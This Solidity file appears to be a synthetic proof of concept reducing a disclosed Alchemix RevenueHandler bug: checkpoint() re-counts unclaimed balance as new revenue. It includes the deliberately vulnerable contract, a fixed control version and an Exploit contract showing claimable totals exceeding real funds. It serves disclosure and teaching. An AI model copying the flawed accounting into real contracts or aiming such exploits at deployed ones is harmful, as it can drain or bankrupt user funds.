// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — Insolvency in RevenueHandler.sol because unclaimed revenue is
    re-counted (Immunefi, Django, finding #38111)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. The vulnerable
    checkpoint() body (poolAdapter == 0 / non-alchemic-token path) is inlined
    VERBATIM; the Exploit deploys a reduced RevenueHandler, accrues revenue
    once, then checkpoints again with NO new revenue arriving, and shows the
    claimable total DOUBLES anyway — exceeding the contract's real token
    balance (insolvency), with no fork and no time-warp cheatcodes (the
    once-per-epoch guard is driven by an explicit scaffold flag instead of
    real block.timestamp/WEEK arithmetic, so the PoC needs no time control).

    Root cause: checkpoint() computes
        uint256 thisBalance = IERC20(token).balanceOf(address(this));
        ...
        amountReceived = thisBalance;
        epochRevenues[currentEpoch][token] += amountReceived;
    for the non-alchemic-token path. `thisBalance` is the contract's ENTIRE
    current balance — including revenue that was already checkpointed in a
    prior epoch and never claimed. Each checkpoint() therefore re-counts
    previously-recorded, still-unclaimed revenue as if it were brand new,
    growing `epochRevenues` (and therefore every holder's claimable total)
    without any new tokens ever arriving.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @notice Reduced RevenueHandler. `advanceEpoch()` is test scaffolding that
///         marks a new epoch as ready to checkpoint — standing in for the
///         real `block.timestamp >= currentEpoch + WEEK` guard so the PoC
///         needs no time-warp cheatcodes. This affects ONLY the once-per-
///         epoch gating; the vulnerable accounting line below is untouched
///         and verbatim.
contract RevenueHandler {
    uint256 public currentEpoch;
    address public token;
    bool private epochReady = true; // true == a new epoch is ready to be checkpointed

    mapping(uint256 => mapping(address => uint256)) public epochRevenues;

    constructor(address _token) {
        token = _token;
    }

    /// @dev Test scaffolding only — marks that a new epoch has elapsed.
    function advanceEpoch() external {
        epochReady = true;
    }

    /**
     * @notice checkpoint — must be called once per epoch to record revenue
     */
    function checkpoint() public {
        // only run checkpoint() once per epoch
        if (epochReady) {
            epochReady = false;
            currentEpoch += 1;

            uint256 thisBalance = MockToken(token).balanceOf(address(this));

            // poolAdapter == address(0): the revenue token is not an alchemic-token
            uint256 amountReceived = thisBalance;

            // @> VULN: `thisBalance` includes previously-checkpointed, still-unclaimed
            //          revenue — re-adding it here double(triple, ...)-counts it.
            epochRevenues[currentEpoch][token] += amountReceived;
            // FIX: amountReceived = thisBalance - lastCheckpointedBalance[token]; lastCheckpointedBalance[token] = thisBalance;
        }
    }

    /// @notice Simplified claimable: this reduction models a single holder who
    ///         always owns 100% of the ve supply at every epoch, so their
    ///         claimable total is the SUM of every recorded epoch's revenue —
    ///         mirroring the real claimable()'s loop over epochRevenues with a
    ///         constant (1.0) share ratio.
    function claimable(address _token) external view returns (uint256 total) {
        for (uint256 e = 1; e <= currentEpoch; e++) {
            total += epochRevenues[e][_token];
        }
    }
}

/// @notice Fixed RevenueHandler, for the control test: tracks the previously
///         checkpointed balance and only counts the NEW delta each epoch.
contract RevenueHandlerFixed {
    uint256 public currentEpoch;
    address public token;
    bool private epochReady = true;

    mapping(uint256 => mapping(address => uint256)) public epochRevenues;
    mapping(address => uint256) public lastCheckpointedBalance;

    constructor(address _token) {
        token = _token;
    }

    function advanceEpoch() external {
        epochReady = true;
    }

    function checkpoint() public {
        if (epochReady) {
            epochReady = false;
            currentEpoch += 1;

            uint256 thisBalance = MockToken(token).balanceOf(address(this));
            uint256 amountReceived = thisBalance - lastCheckpointedBalance[token];
            lastCheckpointedBalance[token] = thisBalance;

            epochRevenues[currentEpoch][token] += amountReceived;
        }
    }

    function claimable(address _token) external view returns (uint256 total) {
        for (uint256 e = 1; e <= currentEpoch; e++) {
            total += epochRevenues[e][_token];
        }
    }
}

/// @notice Demonstrates the insolvency: revenue is checkpointed once, then
///         checkpointed AGAIN with no new revenue transferred in — and the
///         claimable total doubles anyway, exceeding the real token balance.
contract Exploit {
    MockToken public token;
    RevenueHandler public revenueHandler;

    uint256 public constant REV_AMOUNT = 1000 ether;

    constructor() {
        token = new MockToken();
        revenueHandler = new RevenueHandler(address(token));
        token.mint(address(revenueHandler), REV_AMOUNT);
    }

    function run() external {
        revenueHandler.checkpoint();
        uint256 claimable1 = revenueHandler.claimable(address(token));
        require(claimable1 == REV_AMOUNT, "expected first checkpoint to correctly record the revenue");

        // Simulate an elapsed epoch with NO new revenue transferred in at all.
        revenueHandler.advanceEpoch();
        revenueHandler.checkpoint();
        uint256 claimable2 = revenueHandler.claimable(address(token));

        uint256 actualBalance = token.balanceOf(address(revenueHandler));
        require(actualBalance == REV_AMOUNT, "sanity: no new revenue should have arrived");

        // HARM: claimable doubled even though nothing new arrived, and now
        // exceeds the contract's real token balance — insolvency.
        require(claimable2 == REV_AMOUNT * 2, "harm not demonstrated: claimable should double with no new revenue");
        require(claimable2 > actualBalance, "harm not demonstrated: claimable should exceed real balance (insolvency)");
    }
}
